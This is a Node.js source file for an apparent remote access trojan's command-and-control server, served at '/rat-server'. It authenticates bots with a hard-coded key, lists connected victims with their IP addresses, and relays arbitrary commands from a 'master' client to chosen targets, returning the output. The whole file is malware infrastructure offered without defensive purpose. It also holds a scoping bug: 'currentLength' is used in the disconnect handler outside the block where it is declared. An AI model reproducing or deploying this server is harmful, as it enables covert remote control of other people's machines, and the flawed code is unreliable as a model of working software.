var server = require('http').createServer();

var io = require('socket.io')(server, {
  path: '/rat-server'
});

const client_socket_list = [];
const master = {id: 'cow', socket: null};

io.use((socket, next) => {
    if (socket.handshake.query.app_key == "X-TOKEN" && socket.handshake.query.client_id){
      return next();
    } else {
      console.log('authentication error');
      return next(new Error('authentication error'));
    }    
  });

  io.on('connection', function(socket) {
    const client_id = socket.handshake.query.client_id;
    console.log(`[${client_id}] connected!`);

    if(master.id == client_id) {
      master.socket = socket;
    }
    else {
      const currentLength = client_socket_list.push({
        client_id, 
        socket,
        connected: true
      });
    }

    socket.on('client_list', function () {
      var clients = client_socket_list.map((clients) => {
        return {
          client_id: clients.client_id,
          ip: clients.socket.handshake.address,
          connected: clients.connected
        };
      })
      if(master.socket) {
        master.socket.emit('client_list', clients);
      }
    });

    socket.on('command', function (target, cmd) {
      console.log(`[${client_id}] sent [${cmd}] to [${target}]`);
      var client = client_socket_list.find(client => client.client_id == target);

      if(client) {
        console.log(`client connection - ${client.connected}`);
        //send command to target client
        client.socket.emit('command', cmd)

        //echo to master
        if(master.socket) {
          master.socket.emit('result', `client connection - ${client.connected}`);
        }
      }
    });

    socket.on('result', (result) => {
      console.log(`--------------${client_id} --------------`);
      console.log(result);
      console.log('-----------------------------------------');
      if(master.socket) {
        master.socket.emit('result', result);
      }
    });
    
    socket.on('disconnect', function () {
      console.log(`[${client_id}] disconnected!`);
      client_socket_list[currentLength-1].connected = false;
    });


});


server.listen({host: '0.0.0.0', port: 3000}, function() {
    console.log('listening on *:3000');
});